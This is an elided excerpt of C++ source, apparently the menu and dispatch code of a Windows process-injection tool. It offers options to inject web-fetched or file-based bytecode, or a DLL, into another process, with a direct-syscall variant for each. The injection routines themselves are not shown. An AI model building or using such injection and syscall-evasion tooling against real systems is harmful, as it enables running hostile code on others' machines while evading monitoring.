...
#include ".\lib\syscalls\invoker_syscalls.h"
...
void Main_InjectBytcodeWeb(bool syscall = false) {
	printf("################################# EXAMPLES #################################\n");
		...
		if (payload.length() > 0) {
			...
			if (payload.length() > 0) {
				...
				if (GetProcessID(&pid)) {
					...
					syscall ? DSCInjectBytecode(pid, payload) : InjectBytecode(pid, payload);
				}
			}
		}
	}
...
void Main_InjectBytcodeFile(bool syscall = false) {
	printf("################################# EXAMPLES #################################\n");
...
void Main_InjectDLL(bool syscall = false) {
	printf("################################# EXAMPLES #################################\n");
	...
	if (file.length() < 1) {
		...
		if (GetProcessID(&pid)) {
			printf("\n");
			syscall ? DSCInjectDLL(pid, file) : InjectDLL(pid, file);
		}
	}
}
...
void Main_DSC() {
	...
	do {
		...
		printf("# [0] Exit                                                                 #\n");
		printf("#--------------------------------------------------------------------------#\n");
		printf("# [1] Inject Bytecode From Web                                             #\n");
		printf("# [2] Inject Bytecode From File                                            #\n");
		printf("#--------------------------------------------------------------------------#\n");
		printf("# [3] Inject DLL                                                           #\n");
		printf("################################### NOTE ###################################\n");
		...
		if (IsPositiveNumber(choice)) {
			...
			if (StrToDWORD(choice, &num) && num >= 1 && num <= 3) {
				switch (num) {
					case 1: { Main_InjectBytcodeWeb(true);  break; }
					case 2: { Main_InjectBytcodeFile(true); break; }
					case 3: { Main_InjectDLL(true);         break; }
				}
				Pause();
				Clear();
			}
